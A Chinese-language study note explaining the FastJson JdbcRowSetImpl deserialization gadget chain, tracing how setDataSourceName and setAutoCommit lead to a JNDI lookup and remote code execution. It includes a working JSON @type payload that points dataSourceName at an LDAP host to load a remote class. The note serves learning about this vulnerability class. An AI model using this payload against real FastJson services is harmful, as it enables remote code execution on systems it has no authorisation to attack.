# FastJson-JDBCRowSetImpl利用链

介绍：

JDBCRowSetImpl利用链是FastJson反序列化漏洞利用链中的其中一条链，
位于com.sun.rowset.JDBCRowSetImpl，是JDK自带的类，默认存在，并且不需要额外依赖。

用作利用链的成因：

在JDBCRowSetImpl中有两个关键的属性和方法，
第一个是 setDataSourceName，
在这里的String name参数可控，
就可以设置一个JNDI地址，比如rmi://x.x.x.x:1099/Exploit

<img width="1137" height="420" alt="image" src="https://github.com/user-attachments/assets/6d312b1d-2e8b-47b1-b18d-35b136259490" />

第二个是 setAutoCommit，
在设置这个autoCommit参数的时候，JdbcRowsetImpl就会触发connect()方法，
内部调用lookup(dataSourceName)，
这个时候lookup就回去远程加载我们传入的dataSourceName，如果传入的是JNDI，那就会远程加载恶意对象。

<img width="1203" height="651" alt="image" src="https://github.com/user-attachments/assets/d4bf62d0-84a4-40a7-93d0-054d39426a7f" />

<img width="1620" height="1239" alt="image" src="https://github.com/user-attachments/assets/a1f8aa2a-da85-43f2-baaa-0664d6f114e3" />

Payload：

{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.26.1:1389/nlnvkb\",\"autoCommit\":true}

<img width="1860" height="351" alt="image" src="https://github.com/user-attachments/assets/a0b579ee-2d4b-41b7-808b-83012fa3ad2d" />

当调用parseObject(json)时，FastJson会自动调用目标类的setter方法，
刚才提到的setDataSourceName和setAutoCommit正好都是setter方法。

在setDataSourceName(String name)中把传入的值保存到成员变量dataSourceName，我们可以将它设置为JNDI地址。

在setAutoCommit(true) ，设置参数时会调用connect()方法，connet方法内部会执行lookup(dataSourceName)，

如果这个时候dataSourceName是一个JNDI地址，就会触发JNDI远程加载对象。

parseObject在反序列化时先是调用setDataSourceName()触发恶意JNDI地址，然后调用setAutoCommit()触发connect()，
之后connect()又在内部调用lookup(dataSourceName)，最后发起JNDI请求，远程加载对象。

总结：

Fastjson的@type机制会自动调用目标类的setter方法，setDataSourceName()参数可控——>传入恶意JNDI地址，
setAutoCommit(true)——>触发connect()——>connect()内部触发lookup(dataSourceName)——>JNDI远程加载类——RCE。


参考连接：

https://y4er.com/posts/fastjson-learn/

https://www.bilibili.com/video/BV1pP411N726/



















































